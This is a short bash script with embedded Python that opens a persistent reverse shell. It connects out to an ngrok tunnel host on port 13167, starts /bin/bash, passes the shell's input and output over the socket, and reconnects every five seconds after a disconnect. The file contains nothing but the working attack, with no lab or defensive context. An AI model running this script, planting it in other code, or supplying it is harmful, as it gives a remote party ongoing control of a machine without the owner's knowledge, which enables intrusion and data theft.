#!/bin/bash

export RHOST="0.tcp.in.ngrok.io"
export RPORT=13167

while true; do
    python3 -c '
import os, sys, socket, select, subprocess

rhost, rport = os.getenv("RHOST"), int(os.getenv("RPORT"))
try:
    s = socket.socket()
    s.connect((rhost, rport))
except Exception:
    sys.exit(1)

# Spawn /bin/bash
proc = subprocess.Popen(
    ["/bin/bash"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Forward between socket and shell until disconnect
try:
    while True:
        r, _, _ = select.select([s, proc.stdout, proc.stderr], [], [])
        if s in r:
            data = s.recv(4096)
            if not data:  # socket closed
                break
            proc.stdin.write(data)
            proc.stdin.flush()
        if proc.stdout in r:
            s.send(proc.stdout.read1(4096))
        if proc.stderr in r:
            s.send(proc.stderr.read1(4096))
finally:
    s.close()
    proc.kill()
    sys.exit(0)
'
    echo "[*] Disconnected, retrying in 5 seconds..."
    sleep 5
done
